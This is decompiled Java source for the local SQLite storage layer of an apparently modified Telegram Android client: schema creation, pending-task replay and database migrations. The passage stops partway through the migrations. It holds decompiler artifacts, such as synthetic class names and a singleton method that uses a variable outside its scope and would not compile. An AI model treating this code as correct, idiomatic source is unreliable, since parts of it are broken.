package org.telegram.messenger;

import android.text.TextUtils;
import android.util.SparseArray;
import android.util.SparseIntArray;
import com.google.gson.Gson;
import java.io.File;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Comparator;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Locale;
import java.util.Map;
import java.util.Map.Entry;
import java.util.concurrent.Semaphore;
import java.util.concurrent.atomic.AtomicLong;
import org.telegram.PhoneFormat.PhoneFormat;
import org.telegram.SQLite.SQLiteCursor;
import org.telegram.SQLite.SQLiteDatabase;
import org.telegram.SQLite.SQLiteException;
import org.telegram.SQLite.SQLitePreparedStatement;
import org.telegram.customization.Internet.HandleRequest;
import org.telegram.customization.Internet.IResponseReceiver;
import org.telegram.customization.Model.TMData;
import org.telegram.customization.fetch.FetchConst;
import org.telegram.messenger.exoplayer2.C0907C;
import org.telegram.messenger.query.BotQuery;
import org.telegram.messenger.query.MessagesQuery;
import org.telegram.messenger.query.SharedMediaQuery;
import org.telegram.tgnet.AbstractSerializedData;
import org.telegram.tgnet.ConnectionsManager;
import org.telegram.tgnet.NativeByteBuffer;
import org.telegram.tgnet.RequestDelegate;
import org.telegram.tgnet.TLObject;
import org.telegram.tgnet.TLRPC$BotInfo;
import org.telegram.tgnet.TLRPC$ChannelParticipant;
import org.telegram.tgnet.TLRPC$Chat;
import org.telegram.tgnet.TLRPC$ChatFull;
import org.telegram.tgnet.TLRPC$ChatParticipant;
import org.telegram.tgnet.TLRPC$ChatParticipants;
import org.telegram.tgnet.TLRPC$Document;
import org.telegram.tgnet.TLRPC$EncryptedChat;
import org.telegram.tgnet.TLRPC$InputChannel;
import org.telegram.tgnet.TLRPC$InputMedia;
import org.telegram.tgnet.TLRPC$InputPeer;
import org.telegram.tgnet.TLRPC$Message;
import org.telegram.tgnet.TLRPC$MessageEntity;
import org.telegram.tgnet.TLRPC$MessageMedia;
import org.telegram.tgnet.TLRPC$Photo;
import org.telegram.tgnet.TLRPC$PhotoSize;
import org.telegram.tgnet.TLRPC$TL_channelFull;
import org.telegram.tgnet.TLRPC$TL_channels_deleteMessages;
import org.telegram.tgnet.TLRPC$TL_chatChannelParticipant;
import org.telegram.tgnet.TLRPC$TL_chatFull;
import org.telegram.tgnet.TLRPC$TL_chatInviteEmpty;
import org.telegram.tgnet.TLRPC$TL_chatParticipant;
import org.telegram.tgnet.TLRPC$TL_chatParticipantAdmin;
import org.telegram.tgnet.TLRPC$TL_chatParticipants;
import org.telegram.tgnet.TLRPC$TL_contact;
import org.telegram.tgnet.TLRPC$TL_decryptedMessageActionScreenshotMessages;
import org.telegram.tgnet.TLRPC$TL_decryptedMessageActionSetMessageTTL;
import org.telegram.tgnet.TLRPC$TL_dialog;
import org.telegram.tgnet.TLRPC$TL_documentEmpty;
import org.telegram.tgnet.TLRPC$TL_inputMediaGame;
import org.telegram.tgnet.TLRPC$TL_inputMessageEntityMentionName;
import org.telegram.tgnet.TLRPC$TL_message;
import org.telegram.tgnet.TLRPC$TL_messageActionGameScore;
import org.telegram.tgnet.TLRPC$TL_messageActionHistoryClear;
import org.telegram.tgnet.TLRPC$TL_messageActionPaymentSent;
import org.telegram.tgnet.TLRPC$TL_messageActionPinMessage;
import org.telegram.tgnet.TLRPC$TL_messageEncryptedAction;
import org.telegram.tgnet.TLRPC$TL_messageEntityMentionName;
import org.telegram.tgnet.TLRPC$TL_messageMediaDocument;
import org.telegram.tgnet.TLRPC$TL_messageMediaPhoto;
import org.telegram.tgnet.TLRPC$TL_messageMediaUnsupported;
import org.telegram.tgnet.TLRPC$TL_messageMediaUnsupported_old;
import org.telegram.tgnet.TLRPC$TL_messageMediaWebPage;
import org.telegram.tgnet.TLRPC$TL_message_secret;
import org.telegram.tgnet.TLRPC$TL_messages_botCallbackAnswer;
import org.telegram.tgnet.TLRPC$TL_messages_botResults;
import org.telegram.tgnet.TLRPC$TL_messages_deleteMessages;
import org.telegram.tgnet.TLRPC$TL_messages_dialogs;
import org.telegram.tgnet.TLRPC$TL_messages_messages;
import org.telegram.tgnet.TLRPC$TL_peerChannel;
import org.telegram.tgnet.TLRPC$TL_peerNotifySettings;
import org.telegram.tgnet.TLRPC$TL_peerNotifySettingsEmpty;
import org.telegram.tgnet.TLRPC$TL_photoEmpty;
import org.telegram.tgnet.TLRPC$TL_photos_photos;
import org.telegram.tgnet.TLRPC$TL_replyInlineMarkup;
import org.telegram.tgnet.TLRPC$TL_updates_channelDifferenceTooLong;
import org.telegram.tgnet.TLRPC$TL_userStatusLastMonth;
import org.telegram.tgnet.TLRPC$TL_userStatusLastWeek;
import org.telegram.tgnet.TLRPC$TL_userStatusRecently;
import org.telegram.tgnet.TLRPC$WallPaper;
import org.telegram.tgnet.TLRPC$WebPage;
import org.telegram.tgnet.TLRPC$messages_BotResults;
import org.telegram.tgnet.TLRPC$messages_Dialogs;
import org.telegram.tgnet.TLRPC$messages_Messages;
import org.telegram.tgnet.TLRPC$photos_Photos;
import org.telegram.tgnet.TLRPC.User;

public class MessagesStorage {
    private static volatile MessagesStorage Instance = null;
    public static int lastDateValue = 0;
    public static int lastPtsValue = 0;
    public static int lastQtsValue = 0;
    public static int lastSecretVersion = 0;
    public static int lastSeqValue = 0;
    public static int secretG = 0;
    public static byte[] secretPBytes = null;
    private File cacheFile;
    private SQLiteDatabase database;
    private int lastSavedDate = 0;
    private int lastSavedPts = 0;
    private int lastSavedQts = 0;
    private int lastSavedSeq = 0;
    private AtomicLong lastTaskId = new AtomicLong(System.currentTimeMillis());
    private DispatchQueue storageQueue = new DispatchQueue("storageQueue");

    /* renamed from: org.telegram.messenger.MessagesStorage$4 */
    class C15444 implements Runnable {
        C15444() {
        }

        public void run() {
            try {
                HashMap<Long, Long> ids = new HashMap();
                Map<String, ?> values = ApplicationLoader.applicationContext.getSharedPreferences("Notifications", 0).getAll();
                for (Entry<String, ?> entry : values.entrySet()) {
                    String key = (String) entry.getKey();
                    if (key.startsWith("notify2_")) {
                        Integer value = (Integer) entry.getValue();
                        if (value.intValue() == 2 || value.intValue() == 3) {
                            long flags;
                            key = key.replace("notify2_", "");
                            if (value.intValue() == 2) {
                                flags = 1;
                            } else {
                                Integer time = (Integer) values.get("notifyuntil_" + key);
                                if (time != null) {
                                    flags = (((long) time.intValue()) << 32) | 1;
                                } else {
                                    flags = 1;
                                }
                            }
                            ids.put(Long.valueOf(Long.parseLong(key)), Long.valueOf(flags));
                        } else if (value.intValue() == 3) {
                        }
                    }
                }
                try {
                    MessagesStorage.this.database.beginTransaction();
                    SQLitePreparedStatement state = MessagesStorage.this.database.executeFast("REPLACE INTO dialog_settings VALUES(?, ?)");
                    for (Entry<Long, Long> entry2 : ids.entrySet()) {
                        state.requery();
                        state.bindLong(1, ((Long) entry2.getKey()).longValue());
                        state.bindLong(2, ((Long) entry2.getValue()).longValue());
                        state.step();
                    }
                    state.dispose();
                    MessagesStorage.this.database.commitTransaction();
                } catch (Exception e) {
                    FileLog.e(e);
                }
            } catch (Exception e2) {
                e2.printStackTrace();
            } catch (Throwable e3) {
                FileLog.e(e3);
            }
        }
    }

    /* renamed from: org.telegram.messenger.MessagesStorage$7 */
    class C15587 implements Runnable {
        C15587() {
        }

        public void run() {
            try {
                SQLiteCursor cursor = MessagesStorage.this.database.queryFinalized("SELECT id, data FROM pending_tasks WHERE 1", new Object[0]);
                while (cursor.next()) {
                    final long taskId = cursor.longValue(0);
                    AbstractSerializedData data = cursor.byteBufferValue(1);
                    if (data != null) {
                        int type = data.readInt32(false);
                        final int channelId;
                        final int newDialogType;
                        switch (type) {
                            case 0:
                                TLRPC$Chat chat = TLRPC$Chat.TLdeserialize(data, data.readInt32(false), false);
                                if (chat != null) {
                                    final TLRPC$Chat tLRPC$Chat = chat;
                                    Utilities.stageQueue.postRunnable(new Runnable() {
                                        public void run() {
                                            MessagesController.getInstance().loadUnknownChannel(tLRPC$Chat, taskId);
                                        }
                                    });
                                    break;
                                }
                                break;
                            case 1:
                                channelId = data.readInt32(false);
                                newDialogType = data.readInt32(false);
                                Utilities.stageQueue.postRunnable(new Runnable() {
                                    public void run() {
                                        MessagesController.getInstance().getChannelDifference(channelId, newDialogType, taskId, null);
                                    }
                                });
                                break;
                            case 2:
                            case 5:
                            case 8:
                                final TLRPC$TL_dialog dialog = new TLRPC$TL_dialog();
                                dialog.id = data.readInt64(false);
                                dialog.top_message = data.readInt32(false);
                                dialog.read_inbox_max_id = data.readInt32(false);
                                dialog.read_outbox_max_id = data.readInt32(false);
                                dialog.unread_count = data.readInt32(false);
                                dialog.last_message_date = data.readInt32(false);
                                dialog.pts = data.readInt32(false);
                                dialog.flags = data.readInt32(false);
                                if (type >= 5) {
                                    dialog.pinned = data.readBool(false);
                                    dialog.pinnedNum = data.readInt32(false);
                                }
                                if (type >= 8) {
                                    dialog.unread_mentions_count = data.readInt32(false);
                                }
                                final TLRPC$InputPeer peer = TLRPC$InputPeer.TLdeserialize(data, data.readInt32(false), false);
                                final long j = taskId;
                                AndroidUtilities.runOnUIThread(new Runnable() {
                                    public void run() {
                                        MessagesController.getInstance().checkLastDialogMessage(dialog, peer, j);
                                    }
                                });
                                break;
                            case 3:
                                long random_id = data.readInt64(false);
                                SendMessagesHelper.getInstance().sendGame(TLRPC$InputPeer.TLdeserialize(data, data.readInt32(false), false), (TLRPC$TL_inputMediaGame) TLRPC$InputMedia.TLdeserialize(data, data.readInt32(false), false), random_id, taskId);
                                break;
                            case 4:
                                final long did = data.readInt64(false);
                                final boolean pin = data.readBool(false);
                                final TLRPC$InputPeer TLdeserialize = TLRPC$InputPeer.TLdeserialize(data, data.readInt32(false), false);
                                final long j2 = taskId;
                                AndroidUtilities.runOnUIThread(new Runnable() {
                                    public void run() {
                                        MessagesController.getInstance().pinDialog(did, pin, TLdeserialize, j2);
                                    }
                                });
                                break;
                            case 6:
                                channelId = data.readInt32(false);
                                newDialogType = data.readInt32(false);
                                final TLRPC$InputChannel inputChannel = TLRPC$InputChannel.TLdeserialize(data, data.readInt32(false), false);
                                Utilities.stageQueue.postRunnable(new Runnable() {
                                    public void run() {
                                        MessagesController.getInstance().getChannelDifference(channelId, newDialogType, taskId, inputChannel);
                                    }
                                });
                                break;
                            case 7:
                                channelId = data.readInt32(false);
                                int constructor = data.readInt32(false);
                                TLObject request = TLRPC$TL_messages_deleteMessages.TLdeserialize(data, constructor, false);
                                if (request == null) {
                                    request = TLRPC$TL_channels_deleteMessages.TLdeserialize(data, constructor, false);
                                }
                                if (request != null) {
                                    final TLObject finalRequest = request;
                                    final int i = channelId;
                                    final long j3 = taskId;
                                    AndroidUtilities.runOnUIThread(new Runnable() {
                                        public void run() {
                                            MessagesController.getInstance().deleteMessages(null, null, null, i, true, j3, finalRequest);
                                        }
                                    });
                                    break;
                                }
                                MessagesStorage.this.removePendingTask(taskId);
                                break;
                        }
                        data.reuse();
                    }
                }
                cursor.dispose();
            } catch (Exception e) {
                FileLog.e(e);
            }
        }
    }

    private class Hole {
        public int end;
        public int start;
        public int type;

        public Hole(int s, int e) {
            this.start = s;
            this.end = e;
        }

        public Hole(int t, int s, int e) {
            this.type = t;
            this.start = s;
            this.end = e;
        }
    }

    public interface IntCallback {
        void run(int i);
    }

    public static MessagesStorage getInstance() {
        MessagesStorage localInstance = Instance;
        if (localInstance == null) {
            synchronized (MessagesStorage.class) {
                try {
                    localInstance = Instance;
                    if (localInstance == null) {
                        MessagesStorage localInstance2 = new MessagesStorage();
                        try {
                            Instance = localInstance2;
                            localInstance = localInstance2;
                        } catch (Throwable th) {
                            Throwable th2 = th;
                            localInstance = localInstance2;
                            throw th2;
                        }
                    }
                } catch (Throwable th3) {
                    th2 = th3;
                    throw th2;
                }
            }
        }
        return localInstance;
    }

    public MessagesStorage() {
        this.storageQueue.setPriority(10);
        openDatabase(true);
    }

    public SQLiteDatabase getDatabase() {
        return this.database;
    }

    public DispatchQueue getStorageQueue() {
        return this.storageQueue;
    }

    public void openDatabase(boolean first) {
        this.cacheFile = new File(ApplicationLoader.getFilesDirFixed(), "cache4.db");
        boolean createTable = false;
        if (!this.cacheFile.exists()) {
            createTable = true;
        }
        try {
            this.database = new SQLiteDatabase(this.cacheFile.getPath());
            this.database.executeFast("PRAGMA secure_delete = ON").stepThis().dispose();
            this.database.executeFast("PRAGMA temp_store = 1").stepThis().dispose();
            if (createTable) {
                FileLog.e("create new database");
                this.database.executeFast("CREATE TABLE messages_holes(uid INTEGER, start INTEGER, end INTEGER, PRIMARY KEY(uid, start));").stepThis().dispose();
                this.database.executeFast("CREATE INDEX IF NOT EXISTS uid_end_messages_holes ON messages_holes(uid, end);").stepThis().dispose();
                this.database.executeFast("CREATE TABLE media_holes_v2(uid INTEGER, type INTEGER, start INTEGER, end INTEGER, PRIMARY KEY(uid, type, start));").stepThis().dispose();
                this.database.executeFast("CREATE INDEX IF NOT EXISTS uid_end_media_holes_v2 ON media_holes_v2(uid, type, end);").stepThis().dispose();
                this.database.executeFast("CREATE TABLE messages(mid INTEGER PRIMARY KEY, uid INTEGER, read_state INTEGER, send_state INTEGER, date INTEGER, data BLOB, out INTEGER, ttl INTEGER, media INTEGER, replydata BLOB, imp INTEGER, mention INTEGER)").stepThis().dispose();
                this.database.executeFast("CREATE INDEX IF NOT EXISTS uid_mid_idx_messages ON messages(uid, mid);").stepThis().dispose();
                this.database.executeFast("CREATE INDEX IF NOT EXISTS uid_date_mid_idx_messages ON messages(uid, date, mid);").stepThis().dispose();
                this.database.executeFast("CREATE INDEX IF NOT EXISTS mid_out_idx_messages ON messages(mid, out);").stepThis().dispose();
                this.database.executeFast("CREATE INDEX IF NOT EXISTS task_idx_messages ON messages(uid, out, read_state, ttl, date, send_state);").stepThis().dispose();
                this.database.executeFast("CREATE INDEX IF NOT EXISTS send_state_idx_messages ON messages(mid, send_state, date) WHERE mid < 0 AND send_state = 1;").stepThis().dispose();
                this.database.executeFast("CREATE INDEX IF NOT EXISTS uid_mention_idx_messages ON messages(uid, mention, read_state);").stepThis().dispose();
                this.database.executeFast("CREATE TABLE download_queue(uid INTEGER, type INTEGER, date INTEGER, data BLOB, PRIMARY KEY (uid, type));").stepThis().dispose();
                this.database.executeFast("CREATE INDEX IF NOT EXISTS type_date_idx_download_queue ON download_queue(type, date);").stepThis().dispose();
                this.database.executeFast("CREATE TABLE user_contacts_v7(key TEXT PRIMARY KEY, uid INTEGER, fname TEXT, sname TEXT, imported INTEGER)").stepThis().dispose();
                this.database.executeFast("CREATE TABLE user_phones_v7(key TEXT, phone TEXT, sphone TEXT, deleted INTEGER, PRIMARY KEY (key, phone))").stepThis().dispose();
                this.database.executeFast("CREATE INDEX IF NOT EXISTS sphone_deleted_idx_user_phones ON user_phones_v7(sphone, deleted);").stepThis().dispose();
                this.database.executeFast("CREATE TABLE dialogs(did INTEGER PRIMARY KEY, date INTEGER, unread_count INTEGER, last_mid INTEGER, inbox_max INTEGER, outbox_max INTEGER, last_mid_i INTEGER, unread_count_i INTEGER, pts INTEGER, date_i INTEGER, pinned INTEGER)").stepThis().dispose();
                this.database.executeFast("CREATE INDEX IF NOT EXISTS date_idx_dialogs ON dialogs(date);").stepThis().dispose();
                this.database.executeFast("CREATE INDEX IF NOT EXISTS last_mid_idx_dialogs ON dialogs(last_mid);").stepThis().dispose();
                this.database.executeFast("CREATE INDEX IF NOT EXISTS unread_count_idx_dialogs ON dialogs(unread_count);").stepThis().dispose();
                this.database.executeFast("CREATE INDEX IF NOT EXISTS last_mid_i_idx_dialogs ON dialogs(last_mid_i);").stepThis().dispose();
                this.database.executeFast("CREATE INDEX IF NOT EXISTS unread_count_i_idx_dialogs ON dialogs(unread_count_i);").stepThis().dispose();
                this.database.executeFast("CREATE TABLE randoms(random_id INTEGER, mid INTEGER, PRIMARY KEY (random_id, mid))").stepThis().dispose();
                this.database.executeFast("CREATE INDEX IF NOT EXISTS mid_idx_randoms ON randoms(mid);").stepThis().dispose();
                this.database.executeFast("CREATE TABLE enc_tasks_v2(mid INTEGER PRIMARY KEY, date INTEGER)").stepThis().dispose();
                this.database.executeFast("CREATE INDEX IF NOT EXISTS date_idx_enc_tasks_v2 ON enc_tasks_v2(date);").stepThis().dispose();
                this.database.executeFast("CREATE TABLE messages_seq(mid INTEGER PRIMARY KEY, seq_in INTEGER, seq_out INTEGER);").stepThis().dispose();
                this.database.executeFast("CREATE INDEX IF NOT EXISTS seq_idx_messages_seq ON messages_seq(seq_in, seq_out);").stepThis().dispose();
                this.database.executeFast("CREATE TABLE params(id INTEGER PRIMARY KEY, seq INTEGER, pts INTEGER, date INTEGER, qts INTEGER, lsv INTEGER, sg INTEGER, pbytes BLOB)").stepThis().dispose();
                this.database.executeFast("INSERT INTO params VALUES(1, 0, 0, 0, 0, 0, 0, NULL)").stepThis().dispose();
                this.database.executeFast("CREATE TABLE media_v2(mid INTEGER PRIMARY KEY, uid INTEGER, date INTEGER, type INTEGER, data BLOB)").stepThis().dispose();
                this.database.executeFast("CREATE INDEX IF NOT EXISTS uid_mid_type_date_idx_media ON media_v2(uid, mid, type, date);").stepThis().dispose();
                this.database.executeFast("CREATE TABLE bot_keyboard(uid INTEGER PRIMARY KEY, mid INTEGER, info BLOB)").stepThis().dispose();
                this.database.executeFast("CREATE INDEX IF NOT EXISTS bot_keyboard_idx_mid ON bot_keyboard(mid);").stepThis().dispose();
                this.database.executeFast("CREATE TABLE chat_settings_v2(uid INTEGER PRIMARY KEY, info BLOB, pinned INTEGER)").stepThis().dispose();
                this.database.executeFast("CREATE INDEX IF NOT EXISTS chat_settings_pinned_idx ON chat_settings_v2(uid, pinned) WHERE pinned != 0;").stepThis().dispose();
                this.database.executeFast("CREATE TABLE chat_pinned(uid INTEGER PRIMARY KEY, pinned INTEGER, data BLOB)").stepThis().dispose();
                this.database.executeFast("CREATE INDEX IF NOT EXISTS chat_pinned_mid_idx ON chat_pinned(uid, pinned) WHERE pinned != 0;").stepThis().dispose();
                this.database.executeFast("CREATE TABLE chat_hints(did INTEGER, type INTEGER, rating REAL, date INTEGER, PRIMARY KEY(did, type))").stepThis().dispose();
                this.database.executeFast("CREATE INDEX IF NOT EXISTS chat_hints_rating_idx ON chat_hints(rating);").stepThis().dispose();
                this.database.executeFast("CREATE TABLE botcache(id TEXT PRIMARY KEY, date INTEGER, data BLOB)").stepThis().dispose();
                this.database.executeFast("CREATE INDEX IF NOT EXISTS botcache_date_idx ON botcache(date);").stepThis().dispose();
                this.database.executeFast("CREATE TABLE users_data(uid INTEGER PRIMARY KEY, about TEXT)").stepThis().dispose();
                this.database.executeFast("CREATE TABLE users(uid INTEGER PRIMARY KEY, name TEXT, status INTEGER, data BLOB)").stepThis().dispose();
                this.database.executeFast("CREATE TABLE chats(uid INTEGER PRIMARY KEY, name TEXT, data BLOB)").stepThis().dispose();
                this.database.executeFast("CREATE TABLE enc_chats(uid INTEGER PRIMARY KEY, user INTEGER, name TEXT, data BLOB, g BLOB, authkey BLOB, ttl INTEGER, layer INTEGER, seq_in INTEGER, seq_out INTEGER, use_count INTEGER, exchange_id INTEGER, key_date INTEGER, fprint INTEGER, fauthkey BLOB, khash BLOB, in_seq_no INTEGER, admin_id INTEGER, mtproto_seq INTEGER)").stepThis().dispose();
                this.database.executeFast("CREATE TABLE channel_users_v2(did INTEGER, uid INTEGER, date INTEGER, data BLOB, PRIMARY KEY(did, uid))").stepThis().dispose();
                this.database.executeFast("CREATE TABLE channel_admins(did INTEGER, uid INTEGER, PRIMARY KEY(did, uid))").stepThis().dispose();
                this.database.executeFast("CREATE TABLE contacts(uid INTEGER PRIMARY KEY, mutual INTEGER)").stepThis().dispose();
                this.database.executeFast("CREATE TABLE wallpapers(uid INTEGER PRIMARY KEY, data BLOB)").stepThis().dispose();
                this.database.executeFast("CREATE TABLE user_photos(uid INTEGER, id INTEGER, data BLOB, PRIMARY KEY (uid, id))").stepThis().dispose();
                this.database.executeFast("CREATE TABLE blocked_users(uid INTEGER PRIMARY KEY)").stepThis().dispose();
                this.database.executeFast("CREATE TABLE dialog_settings(did INTEGER PRIMARY KEY, flags INTEGER);").stepThis().dispose();
                this.database.executeFast("CREATE TABLE web_recent_v3(id TEXT, type INTEGER, image_url TEXT, thumb_url TEXT, local_url TEXT, width INTEGER, height INTEGER, size INTEGER, date INTEGER, document BLOB, PRIMARY KEY (id, type));").stepThis().dispose();
                this.database.executeFast("CREATE TABLE stickers_v2(id INTEGER PRIMARY KEY, data BLOB, date INTEGER, hash TEXT);").stepThis().dispose();
                this.database.executeFast("CREATE TABLE stickers_featured(id INTEGER PRIMARY KEY, data BLOB, unread BLOB, date INTEGER, hash TEXT);").stepThis().dispose();
                this.database.executeFast("CREATE TABLE hashtag_recent_v2(id TEXT PRIMARY KEY, date INTEGER);").stepThis().dispose();
                this.database.executeFast("CREATE TABLE webpage_pending(id INTEGER, mid INTEGER, PRIMARY KEY (id, mid));").stepThis().dispose();
                this.database.executeFast("CREATE TABLE sent_files_v2(uid TEXT, type INTEGER, data BLOB, PRIMARY KEY (uid, type))").stepThis().dispose();
                this.database.executeFast("CREATE TABLE search_recent(did INTEGER PRIMARY KEY, date INTEGER);").stepThis().dispose();
                this.database.executeFast("CREATE TABLE media_counts_v2(uid INTEGER, type INTEGER, count INTEGER, PRIMARY KEY(uid, type))").stepThis().dispose();
                this.database.executeFast("CREATE TABLE keyvalue(id TEXT PRIMARY KEY, value TEXT)").stepThis().dispose();
                this.database.executeFast("CREATE TABLE bot_info(uid INTEGER PRIMARY KEY, info BLOB)").stepThis().dispose();
                this.database.executeFast("CREATE TABLE pending_tasks(id INTEGER PRIMARY KEY, data BLOB);").stepThis().dispose();
                this.database.executeFast("CREATE TABLE requested_holes(uid INTEGER, seq_out_start INTEGER, seq_out_end INTEGER, PRIMARY KEY (uid, seq_out_start, seq_out_end));").stepThis().dispose();
                this.database.executeFast("CREATE TABLE sharing_locations(uid INTEGER PRIMARY KEY, mid INTEGER, date INTEGER, period INTEGER, message BLOB);").stepThis().dispose();
                this.database.executeFast("PRAGMA user_version = 46").stepThis().dispose();
            } else {
                int version = this.database.executeInt("PRAGMA user_version", new Object[0]).intValue();
                FileLog.e("current db version = " + version);
                if (version == 0) {
                    throw new Exception("malformed");
                }
                try {
                    SQLiteCursor cursor = this.database.queryFinalized("SELECT seq, pts, date, qts, lsv, sg, pbytes FROM params WHERE id = 1", new Object[0]);
                    if (cursor.next()) {
                        lastSeqValue = cursor.intValue(0);
                        lastPtsValue = cursor.intValue(1);
                        lastDateValue = cursor.intValue(2);
                        lastQtsValue = cursor.intValue(3);
                        lastSecretVersion = cursor.intValue(4);
                        secretG = cursor.intValue(5);
                        if (cursor.isNull(6)) {
                            secretPBytes = null;
                        } else {
                            secretPBytes = cursor.byteArrayValue(6);
                            if (secretPBytes != null && secretPBytes.length == 1) {
                                secretPBytes = null;
                            }
                        }
                    }
                    cursor.dispose();
                } catch (Exception e) {
                    FileLog.e(e);
                    try {
                        this.database.executeFast("CREATE TABLE IF NOT EXISTS params(id INTEGER PRIMARY KEY, seq INTEGER, pts INTEGER, date INTEGER, qts INTEGER, lsv INTEGER, sg INTEGER, pbytes BLOB)").stepThis().dispose();
                        this.database.executeFast("INSERT INTO params VALUES(1, 0, 0, 0, 0, 0, 0, NULL)").stepThis().dispose();
                    } catch (Exception e2) {
                        FileLog.e(e2);
                    }
                }
                if (version < 46) {
                    updateDbToLastVersion(version);
                }
            }
        } catch (Exception e3) {
            FileLog.e(e3);
            if (first && e3.getMessage().contains("malformed")) {
                cleanupInternal();
                UserConfig.dialogsLoadOffsetId = 0;
                UserConfig.totalDialogsLoadCount = 0;
                UserConfig.dialogsLoadOffsetDate = 0;
                UserConfig.dialogsLoadOffsetUserId = 0;
                UserConfig.dialogsLoadOffsetChatId = 0;
                UserConfig.dialogsLoadOffsetChannelId = 0;
                UserConfig.dialogsLoadOffsetAccess = 0;
                UserConfig.saveConfig(false);
                openDatabase(false);
            }
        }
        loadUnreadMessages();
        loadPendingTasks();
    }

    private void updateDbToLastVersion(final int currentVersion) {
        this.storageQueue.postRunnable(new Runnable() {
            public void run() {
                try {
                    SQLiteCursor cursor;
                    SQLitePreparedStatement state;
                    NativeByteBuffer data;
                    int version = currentVersion;
                    if (version < 4) {
                        MessagesStorage.this.database.executeFast("CREATE TABLE IF NOT EXISTS user_photos(uid INTEGER, id INTEGER, data BLOB, PRIMARY KEY (uid, id))").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("DROP INDEX IF EXISTS read_state_out_idx_messages;").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("DROP INDEX IF EXISTS ttl_idx_messages;").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("DROP INDEX IF EXISTS date_idx_messages;").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("CREATE INDEX IF NOT EXISTS mid_out_idx_messages ON messages(mid, out);").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("CREATE INDEX IF NOT EXISTS task_idx_messages ON messages(uid, out, read_state, ttl, date, send_state);").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("CREATE INDEX IF NOT EXISTS uid_date_mid_idx_messages ON messages(uid, date, mid);").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("CREATE TABLE IF NOT EXISTS user_contacts_v6(uid INTEGER PRIMARY KEY, fname TEXT, sname TEXT)").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("CREATE TABLE IF NOT EXISTS user_phones_v6(uid INTEGER, phone TEXT, sphone TEXT, deleted INTEGER, PRIMARY KEY (uid, phone))").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("CREATE INDEX IF NOT EXISTS sphone_deleted_idx_user_phones ON user_phones_v6(sphone, deleted);").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("CREATE INDEX IF NOT EXISTS mid_idx_randoms ON randoms(mid);").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("CREATE TABLE IF NOT EXISTS sent_files_v2(uid TEXT, type INTEGER, data BLOB, PRIMARY KEY (uid, type))").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("CREATE TABLE IF NOT EXISTS blocked_users(uid INTEGER PRIMARY KEY)").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("CREATE TABLE IF NOT EXISTS download_queue(uid INTEGER, type INTEGER, date INTEGER, data BLOB, PRIMARY KEY (uid, type));").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("CREATE INDEX IF NOT EXISTS type_date_idx_download_queue ON download_queue(type, date);").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("CREATE TABLE IF NOT EXISTS dialog_settings(did INTEGER PRIMARY KEY, flags INTEGER);").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("CREATE INDEX IF NOT EXISTS send_state_idx_messages ON messages(mid, send_state, date) WHERE mid < 0 AND send_state = 1;").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("CREATE INDEX IF NOT EXISTS unread_count_idx_dialogs ON dialogs(unread_count);").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("UPDATE messages SET send_state = 2 WHERE mid < 0 AND send_state = 1").stepThis().dispose();
                        MessagesStorage.this.fixNotificationSettings();
                        MessagesStorage.this.database.executeFast("PRAGMA user_version = 4").stepThis().dispose();
                        version = 4;
                    }
                    if (version == 4) {
                        MessagesStorage.this.database.executeFast("CREATE TABLE IF NOT EXISTS enc_tasks_v2(mid INTEGER PRIMARY KEY, date INTEGER)").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("CREATE INDEX IF NOT EXISTS date_idx_enc_tasks_v2 ON enc_tasks_v2(date);").stepThis().dispose();
                        MessagesStorage.this.database.beginTransaction();
                        cursor = MessagesStorage.this.database.queryFinalized("SELECT date, data FROM enc_tasks WHERE 1", new Object[0]);
                        state = MessagesStorage.this.database.executeFast("REPLACE INTO enc_tasks_v2 VALUES(?, ?)");
                        if (cursor.next()) {
                            int date = cursor.intValue(0);
                            data = cursor.byteBufferValue(1);
                            if (data != null) {
                                int length = data.limit();
                                for (int a = 0; a < length / 4; a++) {
                                    state.requery();
                                    state.bindInteger(1, data.readInt32(false));
                                    state.bindInteger(2, date);
                                    state.step();
                                }
                                data.reuse();
                            }
                        }
                        state.dispose();
                        cursor.dispose();
                        MessagesStorage.this.database.commitTransaction();
                        MessagesStorage.this.database.executeFast("DROP INDEX IF EXISTS date_idx_enc_tasks;").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("DROP TABLE IF EXISTS enc_tasks;").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("ALTER TABLE messages ADD COLUMN media INTEGER default 0").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("PRAGMA user_version = 6").stepThis().dispose();
                        version = 6;
                    }
                    if (version == 6) {
                        MessagesStorage.this.database.executeFast("CREATE TABLE IF NOT EXISTS messages_seq(mid INTEGER PRIMARY KEY, seq_in INTEGER, seq_out INTEGER);").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("CREATE INDEX IF NOT EXISTS seq_idx_messages_seq ON messages_seq(seq_in, seq_out);").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("ALTER TABLE enc_chats ADD COLUMN layer INTEGER default 0").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("ALTER TABLE enc_chats ADD COLUMN seq_in INTEGER default 0").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("ALTER TABLE enc_chats ADD COLUMN seq_out INTEGER default 0").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("PRAGMA user_version = 7").stepThis().dispose();
                        version = 7;
                    }
                    if (version == 7 || version == 8 || version == 9) {
                        MessagesStorage.this.database.executeFast("ALTER TABLE enc_chats ADD COLUMN use_count INTEGER default 0").stepThis().dispose();
